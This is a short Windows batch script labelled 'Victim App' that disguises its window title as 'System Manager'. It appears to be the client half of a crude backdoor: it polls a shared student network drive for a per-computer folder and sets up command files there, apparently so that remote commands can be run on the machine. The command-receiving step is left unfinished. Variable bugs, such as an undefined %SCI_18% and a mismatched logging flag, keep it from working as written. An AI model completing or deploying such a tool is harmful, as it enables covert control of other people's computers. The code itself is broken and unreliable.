::
::
:: Victim App | By 1K0DE
::
::

@echo off
cls
title System Manager
set "_CB_=P:\Composite\All Students\"
set "_DEVICES_=%_CB_%\BackBatch\Devices"
set "__DoLogs__=true"
set "__LogFile__=C:\Users\%Username%\Desktop\LogFile.txt"
if "%__DoLogs%" == "true" (
	echo __StartedLogs__>"%__LogFile__%"
)
:::::::::::::::::::: Individual File Setup ::::::::::::::::::::
set "Computer_Id=SCI_18"
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
goto collab_search
goto crash

:collab_search
if exist "%_DEVICES_%\%SCI_18%" (
	goto check_exec_files_1
) else (
	ping localhost -n 2 > nul
	goto collab_search
)
goto crash

:check_exec_files_1
ping localhost -n 1 > nul
if exist "%_DEVICES_%\%SCI_18%\CMD_EXEC.txt" (
	goto check_exec_files_2
) else (
	echo NO_COMMAND>"%_DEVICES_%\%SCI_18%\CMD_EXEC.txt"
	goto check_exec_files_2
)
goto crash

:check_exec_files_2
ping localhost -n 1 > nul
if exist "%_DEVICES_%\%SCI_18%\EXEC_CMD.txt" (
	goto recieve_cmds
) else (
	echo NO_COMMAND>"%_DEVICES_%\%SCI_18%\EXEC_CMD.txt"
	goto recieve_cmds
)
goto crash

:recieve_cmds
set /p ""


:crash
echo Crashed>>"%__LogFile__%"
ping localhost -n 2 > nul
goto collab_search
